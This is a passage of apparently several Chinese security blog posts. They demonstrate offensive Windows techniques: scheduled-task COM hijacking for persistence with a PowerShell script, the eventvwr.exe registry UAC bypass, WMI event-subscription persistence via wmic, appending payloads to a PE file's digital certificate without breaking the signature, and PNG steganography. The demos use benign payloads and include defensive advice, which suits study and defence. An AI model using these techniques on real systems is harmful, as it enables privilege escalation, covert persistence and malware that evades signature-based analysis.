但是在Scheduled Task面板的日志中会提示DLL中出错(0x800401F9)，如图 猜测是导出函数的问题导致dll加载报错，使用dumpbin查看计划任务UserTask对应的原dll的导出函数，执行： dumpbin /exports C:\Windows\system32\dimsjob.dll 注：UserTask对应的原dll的绝对路径为C:\Windows\system32\dimsjob.dll 获得dimsjob.dll的导出函数表，如图 所以需要为dll添加新的导出函数： DllCanUnloadNow DllGetClassObject DllRegisterServer DllUnregisterServer 注： 具体为dll添加导出函数的方法在《Code Execution of Regsvr32.exe》做了详细介绍，此处略过 添加成功后，dumpbin查看结果如图 替换旧的MessageBox32.dll，注销用户，重新登录，新的MessageBox32.dll被加载，弹框 查看Scheduled Task面板的日志，问题解决，操作成功完成，如图 以上操作可通过powershell自动实现，修改UserTask的代码如下： function Invoke-ScheduledTaskComHandlerUserTask { [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#39;Medium&#39;)] Param ( [Parameter(Mandatory = $True)] [ValidateNotNullOrEmpty()] [String] $Command, [Switch] $Force ) $ScheduledTaskCommandPath = &quot;HKCU:\Software\Classes\CLSID\{58fb76b9-ac85-4e55-ac04-427593b1d060}\InprocServer32&quot; if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null)){ New-Item $ScheduledTaskCommandPath -Force | New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null }else{ Write-Verbose &quot;Key already exists, consider using -Force&quot; exit } if (Test-Path $ScheduledTaskCommandPath) { Write-Verbose &quot;Created registry entries to hijack the UserTask&quot; }else{ Write-Warning &quot;Failed to create registry key, exiting&quot; exit } } Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose 测试系统： Win7 x86 在运行后，当用户重新登录后，加载dll，实际演示如图 依次执行DLL_PROCESS_ATTACH()和DllGetClassObject(),由于DllGetClassObject()仅作弹框，所以之后会显示taskhost.exe报错 注：此处仅作演示，暂不介绍具体解决方法 至此，成功劫持计划任务UserTask，在系统启动时加载testmsg.dll 0x04 UACBypass 计划任务同注册表HKCR:\下的键值存在对应关系，同样一些高权限的程序也会调用HKCR:\下的键值，这就为Bypass UAC带来了可能。 同样的原理，通过修改HKEY_CURRENT_USER\Software\Classes\下的键值同步修改HKCR:\下的键值，如果高权限的程序在运行过程中调用此处被修改过的键值，自然就实现了Bypass UAC，以高权限启动我们设定的程序。 此处的难点在于找到这个高权限的程序 方法：借助Process Monitor，可以查看程序运行过程中的注册表、文件、网络、进程间的调用关系 接下来使用Process Monitor复现一下Matt Nelson@enigma0x3发现的过程 1、找到高权限的exeMatt Nelson@enigma0x3的方法为使用sigcheck查看exe的manifest 参数如下： sigcheck.exe -m c:\windows\system32\eventvwr.exe 返回结果如图 从level=”highestAvailable”得知eventvwr.exe的权限为高权限 注： 提供一个更加直观的判断方法： 查看文件图标，如果带有UAC标志，那么一定是高权限的程序，如图 2、使用Process Monitor查看进程调用关系启动Process Monitor 运行eventvwr.exe Process Monitor选择Tools-Process Tree，找到eventvwr.exe，右键-Go To Event，如图 仔细查看进程调用关系，如图 找到如下信息： eventvwr.exe的权限为high eventvwr.exe首先查询键值HKCU\Software\Classes\mscfile\shell\open\command，查询结果为NAME NOT FOUND eventvwr.exe接着查询键值HKCR\mscfile\shell\open\command，结果为SUCCESS 3、修改测试如果修改键值HKCU\Software\Classes\mscfile\shell\open\command，使其查询结果为SUCCESS，会如何呢？ 下面首先修改键值HKCU\Software\Classes\mscfile\shell\open\command，值为calc.exe 再次运行eventvwr.exe，发现启动了calc.exe 使用Process Monitor查看进程调用关系，如图 此时对键值HKCU\Software\Classes\mscfile\shell\open\command的查询结果为SUCCESS 至此，成功通过修改HKCU\Software\Classes\mscfile\shell\open\command，实现BypassUAC，获得了高权限 calc.exe的权限为high，如图 4、更多结论修改HKCU\Software\Classes\mscfile\shell\open\command后，会劫持所有.msc文件的运行，如gpedit.msc,如图 按照这个方法，我对system32下的所有高权限exe进行了测试，尚未发现根据同样的方法利用command键值实现的UACBypass，但是其他键值仍值得测试。 0x05 防御 Win10系统已对该处做了修复，低版本Windows系统尚未修复，防御建议： set the UAC level to “Always Notify” remove the current user from the Local Administrators group alert on new registry entries in HKCU\Software\Classes\ 引用自https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ 0x06 小结 计划任务中可被用作persistence的dll有很多，在防御上建议对此进行监控。通过Process Monitor寻找BypassUAC的方法值得继续研究，一定会有新的发现。 相关学习资料： https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ https://enigma0x3.net/2016/05/25/userland-persistence-with-scheduled-tasks-and-com-handler-hijacking/ https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Study Notes of WMI Persistence using wmic.exe]]></title>
    <url>%2Fposts%2Fd891c292.html</url>
    <content type="text"><![CDATA[0x00 前言 最近学习了Matt Graeber@mattifestation分享的方法《WMI Persistence using wmic.exe》，让我对WMI的攻击技巧有了新的认识，本文将结合之前的研究心得，分享利用wmic的一些技巧。 参考资料： http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html 0x01 简介 在之前的文章《WMI Attacks》、《WMI Backdoor》、《WMI Defense》中分享了通过Poweshell和mof调用WMI实现的攻击技巧，同样，使用wmic.exe也能达到相同的效果，而且更加直接，只要在cmd下直接运行命令就好。 0x02 搜集信息 获取操作系统相关信息 poweshell代码如下： Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem 换成wmic.exe的命令为： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_OperatingSystem 回显如图 注： 回显内容的格式没有对齐，需要添加参数指定输出格式 按照powershell回显的分行显示,需要添加如下参数： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_OperatingSystem GET /all /FORMAT:list 如图 依此格式，其他通过powershell调用wmi查询的方法均可用wmic实现，例如： powershell代码： Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem 对应 wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ComputerSystem GET /all /FORMAT:list 将结果输出到文件的方法： wmic /OUTPUT:c:\test\1.txt /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ComputerSystem GET /all /FORMAT:list 0x03 注册表操作powershell代码如下： Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles Get-ItemProperty Sys 完整的wmic代码如下： 枚举子项： wmic /NAMESPACE:&quot;\\root\DEFAULT&quot; path stdregprov call EnumKey ^&amp;H80000002,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles&quot; 注册表内容如图 命令返回的结果如图 注： Method execution successful不代表一定能够获得正确的返回结果，此处需要注意参数的正确填写,如图2-6，故意漏掉”,仍然提示Method execution successful，但返回结果错误 枚举指定的关键值： wmic /NAMESPACE:&quot;\\root\DEFAULT&quot; path stdregprov call EnumValues ^&amp;H80000002,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys&quot; 返回结果如图 获取指定值的字符串数据值： wmic /NAMESPACE:&quot;\\root\DEFAULT&quot; path stdregprov call GetStringValue ^&amp;H80000002,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys&quot;,&quot;TasksDir&quot; 返回结果如图 创建子项: wmic /NAMESPACE:&quot;\\root\DEFAULT&quot; path stdregprov call CreateKey ^&amp;H80000002,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test&quot; 返回结果如图 注： 需要注意权限问题，此处需要管理员权限 设置一个命名值的字符串值： wmic /NAMESPACE:&quot;\\root\DEFAULT&quot; path stdregprov call SetStringValue ^&amp;H80000002,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test&quot;,&quot;Data&quot;,&quot;Name&quot; 返回结果如图 注：如果一个命名值不存在，则新建；如果存在，则为修改 删除子项： wmic /NAMESPACE:&quot;\\root\DEFAULT&quot; path stdregprov call DeleteKey ^&amp;H80000002,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test&quot; 删除设置一个命名值： wmic /NAMESPACE:&quot;\\root\DEFAULT&quot; path stdregprov call DeleteValue ^&amp;H80000002,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test&quot;,&quot;Name&quot; 注： 以上参数说明参考自https://msdn.microsoft.com/en-us/library/aa393664(VS.85).aspx 特殊字符^&amp;H80000002含义如下： &amp;H80000000 ‘HKEY_CLASSES_ROOT &amp;H80000001 ‘HKEY_CURRENT_USER &amp;H80000002 ‘HKEY_LOCAL_MACHINE &amp;H80000003 ‘HKEY_USERS &amp;H80000005 ‘HKEY_CURRENT_CONFIG 0x04 虚拟机检测1、查看TotalPhysicalMemory和NumberOfLogicalProcessorswmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ComputerSystem GET NumberOfLogicalProcessors,TotalPhysicalMemory /FORMAT:list 返回结果如图 2、查看当前进程wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Process GET Caption /FORMAT:list 0x05 WMI PersistencePowershell完整的实现代码如下： $filterName = &#39;BotFilter82&#39; $consumerName = &#39;BotConsumer23&#39; $exePath = &#39;C:\Windows\System32\notepad.exe&#39; $Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot; $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @{Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query} -ErrorAction Stop $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath} Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} 接下来分步介绍对应wmic调用的过程 1、Create an __EventFilter instancewmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot; 2、Create an __EventConsumer instancewmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot; 3、Create a __FilterToConsumerBinding instancewmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot; 4、List the EventFilter and EventConsumer instancesFilters： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter GET __RELPATH /FORMAT:list Event Consumers： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list Event Bindings： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list 通过powershell下查看的代码： Filters： Get-WMIObject -Namespace root\Subscription -Class __EventFilter Event Consumers： Get-WMIObject -Namespace root\Subscription -Class __EventConsumer Event Bindings： Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding 5、Remove all instancesFilters： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter WHERE Name=&quot;BotFilter82&quot; DELETE Event Consumers： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer WHERE Name=&quot;BotConsumer23&quot; DELETE Event Bindings： wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding WHERE Filter=&quot;__EventFilter.Name=&#39;BotFilter82&#39;&quot; DELETE 注： wmic中Binding的Filter判断参数”BotFilter82”中”要变成’ 通过powershell清除的实现代码： Filters： Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&#39;BotFilter82&#39;&quot; | Remove-WmiObject -Verbose Event Consumers： Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&#39;BotConsumer23&#39;&quot; | Remove-WmiObject -Verbose Event Bindings： Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &#39;%BotFilter82%&#39;&quot; | Remove-WmiObject -Verbose 0x05 fileless uac bypass using eventvwr exe and registry hijackingwmic的部分操作需要管理员权限，在这里补充一个刚学到的UACbypass技巧 fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking 学习链接： https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ 作者： Matt Nelson @enigma0x3 原理在进程eventvwr.exe启动的时候，首先查找注册表位置HKCU\Software\Classes\mscfile\shell\open\command,如果该处为空，接着查找注册表位置HKCR\mscfile\shell\open\command(此处默认值为%SystemRoot%\system32\mmc.exe &quot;%1&quot; %*),以高权限启动mmc.exe,最后打开eventvwr.msc。 如图 接下来，如果在注册表HKCU\Software\Classes\mscfile\shell\open\command中添加payload，就可以在启动mmc.exe之前执行预设的payload 最重要的一点： 修改注册表HKCU\Software\Classes\mscfile\shell\open\command的键值只需要普通用户权限即可 实现作者分享了通过powershell实现的poc代码，链接如下： https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1 如果poc成功执行，会在C:\UACBypassTest下写入”Is Elevated: True” 注： 默认操作c:\目录下的文件会被uac拦截 我fork了作者的代码，作了细微修改，运行如下命令： C:\Windows\System32\cmd.exe /c copy c:\test\1.txt c:\1.txt 地址为： https://github.com/3gstudent/UAC-Bypass/blob/master/Invoke-EventVwrBypass.ps1 优点该方法同常规的方法有很大不同，优点如下： 无文件 不需要进程注入 不需要复制特权文件 适用环境Win7 Win8.1 Win 10 防御 set the UAC level to “Always Notify” remove the current user from the Local Administrators group alert on new registry entries in HKCU\Software\Classes\ LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[隐写技巧——在PE文件的数字证书中隐藏Payload]]></title>
    <url>%2Fposts%2F9d1bdd8c.html</url>
    <content type="text"><![CDATA[0x00 前言 为了验证PE文件的来源和完整性，常常会为PE文件添加数字证书。Windows系统下默认会对一些重要文件添加微软的数字签名，如ntdll.dll。恶意文件分析系统在对PE文件的静态分析过程中，如果PE文件有数字签名，则对签名进行验证。若数字签名验证通过，则不再对其进行后续分析。这样做主要考虑的是降低误报，以及减少服务器资源消耗。如果能在保证数字签名有效的前提下，在PE文件中隐藏Payload，那么这种隐写方式将会非常隐蔽。 0x01 简介 来自Deep Instinct Research Team的Tom Nipravsky在BlackHat2016的议题《Certificate Bypass: Hiding and Executing Malware from a Digitally Signed Executable》介绍了这个方法，并且实现了一个Reflective PE Loader，用来加载隐藏在PE文件数字证书中的Payload，值得学习。 议题PDF下载地址： https://www.blackhat.com/docs/us-16/materials/us-16-Nipravsky-Certificate-Bypass-Hiding-And-Executing-Malware-From-A-Digitally-Signed-Executable-wp.pdf 本文将会更加详细的介绍如何实现在保证数字签名有效的前提下，向PE文件中隐藏Payload。 0x02 PE文件格式和数字签名格式 图1引用自Windows Authenticode Portable Executable Signature Formathttps://msdn.microsoft.com/en-us/windows/hardware/gg463180.aspx 签名过程： 计算PE文件hash 根据hash生成数字证书 数字签名添加在文件末尾，这部分称作Certificate Table 计算文件hash的步骤： Load the image header into memory. Initialize a hash algorithm context. Hash the image header from its base to immediately before the start of the checksum address, as specified in Optional Header Windows-Specific Fields. Skip over the checksum, which is a 4-byte field. Hash everything from the end of the checksum field to immediately before the start of the Certificate Table entry, as specified in Optional Header Data Directories. Get the Attribute Certificate Table address and size from the Certificate Table entry. For details, see section 5.7 of the PE/COFF specification. Exclude the Certificate Table entry from the calculation and hash everything from the end of the Certificate Table entry to the end of image header, including Section Table (headers).The Certificate Table entry is 8 bytes long, as specified in Optional Header Data Directories. Create a counter called SUM_OF_BYTES_HASHED, which is not part of the signature. Set this counter to the SizeOfHeaders field, as specified in Optional Header Windows-Specific Field. Build a temporary table of pointers to all of the section headers in the image. The NumberOfSections field of COFF File Header indicates how big the table should be. Do not include any section headers in the table whose SizeOfRawData field is zero. Using the PointerToRawData field (offset 20) in the referenced SectionHeader structure as a key, arrange the table’s elements in ascending order. In other words, sort the section headers in ascending order according to the disk-file offset of the sections. Walk through the sorted table, load the corresponding section into memory, and hash the entire section. Use the SizeOfRawData field in the SectionHeader structure to determine the amount of data to hash. Add the section’s SizeOfRawData value to SUM_OF_BYTES_HASHED. Repeat steps 11 and 12 for all of the sections in the sorted table. Create a value called FILE_SIZE, which is not part of the signature. Set this value to the image’s file size, acquired from the underlying file system. If FILE_SIZE is greater than SUM_OF_BYTES_HASHED, the file contains extra data that must be added to the hash. This data begins at the SUM_OF_BYTES_HASHED file offset, and its length is:(File Size) – ((Size of AttributeCertificateTable) + SUM_OF_BYTES_HASHED) 引用自Windows Authenticode Portable Executable Signature Formathttps://msdn.microsoft.com/en-us/windows/hardware/gg463180.aspx 如果修改了文件内容，那么计算出的文件hash就会改变，导致数字证书无法通过验证，所以数字证书能够保证签名文件的完整性，但是在计算文件hash的算法上存在一个不足： 计算文件hash并非对整个文件内容作计算（如计算文件hash的步骤4，以及图1中灰色背景的部分，目的是避免绑定的证书文件影响到hash值） 更值得注意的是： 在Certificate Table的尾部添加数据并不会影响计算出的文件hash，也就是说在Certificate Table尾部添加数据不会导致证书失效 注： 这个思路早在2009年由Aymeric Barthe@bartheph提出 https://blog.barthe.ph/2009/02/22/change-signed-executable/ 当然，在证书尾部添加数据虽然不会影响计算出的文件hash，但会改变证书长度，所以在PE文件结构中保存证书长度的位置需要作相应修改（共2处），下面实例演示一种最直观的添加payload并修改证书长度的方法 0x03 演示一 测试文件： ntdll.dll Win7 x64下默认位置为：C:\Windows\SysWOW64 使用工具： CFF Explorer Hex Editor LordPE 1、定位Certificate Size in Certificate Table使用CFF Explorer查看dll结构，如图 可获得如下信息： File Size: 1292592 bytes PE Size: 1277952 bytes 推断出： Certificate Table的偏移地址为138000H(1277952) Certificate Table的前四字节保存长度，大小应该为14640 bytes（1292592-1277952） 现在跳到偏移地址138000H,查看前四字节，验证推断 如图，前四字节为30390000,转换成实际长度为00003930H,即14640 bytes 2、修改Certificate Size in Certificate Table测试待添加的payload为：1111111111，长度为10 显然， New Size = Old Size + Payload Size = 14640 +10 = 14650 = 393aH 对应偏移地址138000H-138003的数据修改为3A390000,如图 3、定位Certificate Size in Optional Header使用CFF Explorer查看dll结构，选择Nt Headers-Optional Header-Data Directories [x],找到Security Directory Size项，如图 4、修改Certificate Size in Optional Header00003930修改为0000393A，如图 保存文件，查看文件信息，签名失效（因为还没有添加payload） 如图 5、添加payload使用Hex Editor在文件尾部添加payload 如图 保存后，签名成功识别，如图 6、修改PE文件校验和使用LordPE打开PE文件，如图，原文件的校验和为0013E00E 点击”?”对其更新，如图，新的校验和为00142672 使用CFF Explorer打开PE文件，选择Nt Headers-Optional Header，找到CheckSum项 原校验和为0013E00E，如图 修改为00142672，保存为ntdll(AddPayload).dll 使用LordPE验证校验和，成功 至此，在保证PE文件数字证书有效的前提下，成功在PE文件尾部添加Payload 注： 添加的payload长度需要满足为8的整数倍，否则会显示数字签名状态无效 0x04 演示二 测试文件：aliide.sys 1、定位Certificate Size in Certificate Table如图，偏移地址2000H（8192） 跳到偏移地址2000H,查看前四字节，如图 Certificate Size为00001c50H 2、修改Certificate Size in Certificate Table添加的payload为BBBBBBBBBB,10字节 00001c50H+10=00001c5AH 修改为5A1C0000，如图 3、定位Certificate Size in Optional Header如图 4、修改Certificate Size in Optional Header00001C50改为00001C5A 5、添加payload尾部添加BBBBBBBBBB 如图 6、修改PE文件校验和000065ED改为0000B156 添加成功 注： 添加的payload长度需要满足为8的整数倍，否则会显示数字签名状态无效 0x05 程序实现 1、Aymeric Barthe@bartheph的实现方法开发语言：c++ 下载地址： https://blog.barthe.ph/download/2009/AppendPayLoad.tar.bz2 编译成功后，命令行执行： AppendPayLoad.exe ntdll.dll payload.txt newntdll.dll 参数说明： ntdll.dll：原PE文件 payload.txt：存储待添加的payload newntdll.dll：新生成的文件 测试Payload添加成功，新生成文件的数字签名成功识别，程序有如下特点： 1.payload在尾部自动填0补齐payload长度为8的倍数 如图，多了6个’00’，补齐长度 2.未修改PE文件校验和 如图，PE文件校验和实际应该为00142684 2、Joakim Schicht的实现方法开发语言：Autoit 下载地址： http://reboot.pro/files/file/85-digitalsignaturetweaker/ 界面如图 0x06 小结 本文介绍了如何利用工具实现在保证数字签名有效的前提下，向PE文件中隐藏Payload。在掌握了修改方法后，编写程序实现自动修改不会很难。对于带有数字签名的PE文件，建议不要盲目相信。 更新 对添加payload的长度限制做了修正，payload长度需要满足是8的倍数，否则数字签名状态无效(感谢维一零的帮助) LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[隐写技巧——PNG文件中的LSB隐写]]></title>
    <url>%2Fposts%2F14a5d4dd.html</url>
    <content type="text"><![CDATA[0x00 前言上篇对PNG的文件格式进行了分析，介绍了如何在不影响PNG文件的正常浏览下将payload以辅助数据块tEXt的格式插入到PNG文件中。这次将要介绍一个在图像数据块IDAT下隐藏payload的技巧——LSB隐写 图片引用自http://datagenetics.com/blog/march12012/index.html 0x01 简介 IDAT数据块 储存图像像数数据 在数据流中可包含多个连续顺序的图像数据块 采用LZ77算法的派生算法进行压缩 可以用zlib解压缩 zlib解压缩的python实现代码如下: #! /usr/bin/env python import zlib import binascii IDAT = &quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;.decode(&#39;hex&#39;) result = binascii.hexlify(zlib.decompress(IDAT)) print result 引用自http://drops.wooyun.org/tips/4862 LSB隐写 LSB全称least significant bit，最低有效位 PNG文件中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216 种颜色 人类的眼睛可以区分约1000万种不同的颜色 这意味着人类的眼睛无法区分余下的颜色大约有6777216种 LSB隐写就是修改RGB颜色分量的最低二进制位（LSB），而人类的眼睛不会注意到这前后的变化 每个像数可以携带3比特的信息 0x02 Python实现 关于LSB隐写在github上值得学习的项目： https://github.com/RobinDavid/LSB-Steganography https://github.com/cyberinc/cloacked-pixel 下面对cloacked-pixel进行测试 测试图片： 源文件下载地址:http://www.easyicon.net/language.en/1119182-Enderman_Png_icon.html 1、 加密运行： python lsb.py hide big.png 1.txt 123456 参数说明： hide：表示加密模式big.png：待加密的png图片1.txt：存放payload123456：加密的密码 运行后生成图片big.png-stego.png 如图 分析一下加密图片big.png-stego.png的格式，使用上篇文章介绍的check.cpp 下载地址: https://github.com/3gstudent/PNG-Steganography/blob/master/check.cpp 加密前后对比如图 cloacked-pixel在加密的过程中会删除其他数据块，只保留关键数据块IDAT 使用HexEditorNeo查看加密图片也能印证我们的判断，如图 注: 当然也可以通过阅读源码进行分析 2、 解密运行： python lsb.py extract big.png-stego.png 3.txt 123456 参数说明：extract：表示解密模式big.png-stego.png：待解密的png图片3.txt：存放导出的payload123456：解密密码 如图，成功解密获得payload 3、 分析运行： python lsb.py analyse big.png-stego.png 参数说明： analyse：表示分析模式big.png-stego.png ：待分析的png图片运行后会对图像进行分析，将其分割成块，标记每个块的最低有效位 如图 这是加密前后分析对比图 肉眼几乎无法分辨图片的差别，因为payload越短，分析图的差别就越小，这里我们可以借助软件帮助分析 工具名称：Stegsolve 下载地址： http://www.caesum.com/handbook/Stegsolve.jar 环境搭建： 安装jdk，配置java环境 使用Stegsolve打开a.png,选择Analyse-Image Combiner，选择b.png 进行异或对比(XOR),如图，检测到细微的差异 0x03 C++实现 Grant Curell分享了通过c++实现的方法，值得学习，所以在此对其介绍并进行测试 文章地址：http://www.codeproject.com/Articles/581298/PNG-Image-Steganography-with-libpng作者： Grant Curell 代码下载链接： http://www.codeproject.com/KB/security/581298/PNG_stego.zip 测试环境： Win7 X64 vs2012 1、 直接编译会报错项目zlib可直接编译成功 编译项目libpng，错误如下： fatal error C1083: Cannot open include file: &#39;zlib.h&#39;: No such file or directory 解决方法： 需要对项目添加include目录 右键-Property-VC++ Directories 选择Include Directories 如图 添加zlib-1.2.3，输入： ..\..\..\zlib-1.2.3; 如图 再次编译，报错如下： fatal error LNK1181: cannot open input file &#39;zlib.lib&#39; 解决方法： 需要对项目添加lib目录 选择Library Directories 添加zlib.lib，输入： ..\..\..\LIB Debug; 如图，编译成功 Tips： 在Include Directories和Library Directories中也可以直接指定绝对路径(如C:\test\cloacked-pixel-master\PNG_stego\zlib-1.2.3)，本例使用..\表示的是相对路径 编译项目PNG_encode_decode，发生同样的编译错误 解决方法： Include Directories下添加zlib-1.2.3和libpng-1.2.37-src，输入： ../zlib-1.2.3;../libpng-1.2.37-src; Library Directories下添加libpng.lib，输入： ..\LIB Debug; 如图，最终编译成功 注： 三个项目工程存在前后的调用关系，所以编译顺序为zlib-libpng-PNG_encode_decode 2、 加密测试待加密文件：big.png payload文件：1.txt 输出加密文件：bigen.png 项目PNG_encode_decode中的main.cpp修改如下： #include &quot;PNG_file.h&quot; void main() { PNG_file link = PNG_file(&quot;big.png&quot;); link.encode(&quot;1.txt&quot;); link.outputPNG(&quot;bigen.png&quot;); } 运行后生成bigen.png，如图 对比加密前后的文件，大小存在差异，如图 原理上LSB隐写不会改变文件大小，查找原因 使用check.cpp解析数据块目录，发现加密后多了数个tTXt段 如图 使用HexEditorNeo查看加密图片细节，如图 加密后的图片包含了原图片的一些信息，造成了图片大小不同 3、 去掉多余信息方法a: 使用HexEditorNeo直接删除多余信息 方法b： 使用compress.cpp 下载地址： https://github.com/3gstudent/PNG-Steganography/blob/master/compress.cpp 生成去掉多余tTXt段的加密图片bigensimple.png，如图 bigensimple.png同原图片大小相同，如图 4、 解密测试项目PNG_encode_decode中的main.cpp修改如下： #include &quot;PNG_file.h&quot; void main() { PNG_file link = PNG_file(&quot;bigensimple.png&quot;); link.decode(&quot;2.txt&quot;); } 运行后生成2.txt，获得存储加密后的payload (5) 分析对于LSB隐写，可使用Stegsolve辅助分析 打开加密图片后，选择Analyse-DataExtract Bit Planes 选中Reg、Green、Blue的第0位 Bit Order选中LSB First Bit Plane Order选中RGB 可以看到加密形式的payload，如图 注：当然可以通过阅读程序源码找到图片的加密数据，本例只是给出对图片分析的一些参考思路 0x04 小结 本文分别介绍如何通过Python和C++实现对PNG文件的LSB隐写，参照文中的分析思路也可对常见的LSB隐写数据进行提取分析。 注： 修改好的PNG_stego工程已上传至github： https://github.com/3gstudent/PNG_stego-test 更多学习资料： https://github.com/fgrimme/Matroschka https://waronpants.net/article/png-steganography/ https://waronpants.net/pngsteg/trunk/steg.c http://www1.chapman.edu/~nabav100/ImgStegano/ http://www.libpng.org/pub/png/libpng-1.2.5-manual.html#section-3.1 https://www.w3.org/TR/PNG/ LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[隐写技巧——利用PNG文件格式隐藏Payload]]></title>
    <url>%2Fposts%2F33a84fb1.html</url>
    <content type="text"><![CDATA[0x00 前言 隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG的文件格式开始。 图片来自于http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/ 0x01 简介 隐写术可以理解为信息隐藏，在渗透测试中最主要的应用是对Payload的隐藏。本文会对PNG的文件格式进行分析，编写c程序实现自动解析文件格式，并按照其文件格式添加自定义的payload，不仅不会影响图片的正常浏览，同时可将图片上传到网络，使用时将图片下载再以特定格式解密，最终执行payload。 注： 所有程序源码已上传github，地址为：https://github.com/3gstudent/PNG-Steganography 0x02 PNG文件格式 1、PNG文件署名域前8字节 固定格式，16进制为：89 50 4e 47 0d 0a 1a 0a 2、数据块Chunk Type Code(数据块类型码): 4字节,数据块类型码 Chunk Data(数据块数据): 可变长度,存储数据 CRC(循环冗余检测): 4字节,存储用来检测是否有错误的循环冗余码 数据块类型： 1. 关键数据块(critical chunk) (1) 文件头数据块IHDR(header chunk) 包含PNG文件的基本信息 一个PNG数据流中只能有一个IHDR 必须在PNG文件最前面 (2) 调色板数据块PLTE(palette chunk) 包含有与索引彩色图像(indexed-color image)相关的彩色变换数据 必须在IDAT之前 (3) 图像数据块IDAT(image data chunk) 存储实际的数据 可存在多个 必须与其他IDAT连续 (4) 图像结束数据IEND(image trailer chunk) 固定格式，16进制为：00 00 00 00 49 45 4E 44 AE 42 60 82 必须在PNG文件最尾部 2. 辅助数据块(ancillary chunk) 用于辅助指示PNG图像中的层、文字等信息 可删除，不影响图片浏览，但图像将失去原来的可编辑性 (1) 背景颜色数据块bKGD(background color) (2) 基色和白色度数据块cHRM(primary chromaticities and white point) 